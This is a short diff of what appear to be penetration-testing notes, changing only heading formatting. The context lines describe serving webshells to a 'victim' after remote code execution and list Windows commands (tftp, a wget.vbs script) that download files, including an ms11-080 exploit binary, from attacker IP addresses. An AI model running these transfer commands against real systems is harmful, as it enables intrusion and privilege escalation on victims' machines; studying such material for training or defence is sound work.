@@ -1,4 +1,4 @@
-#Serving up code
+# Serving up code
 Once we have RCE, we can sometimes want to serve up files or code to download and execute
 on the victim (e.g., webshell)
 
@@ -24,7 +24,7 @@ on the victim (e.g., webshell)
 
 
 
-#File Transfer
+# File Transfer
 ● Windows
 ○ tftp -i 10.11.0.185 GET test.txt
 ○ cscript wget.vbs http://10.11.0.158/ms11-080.exe -O C:\lec\ms11-080.exe
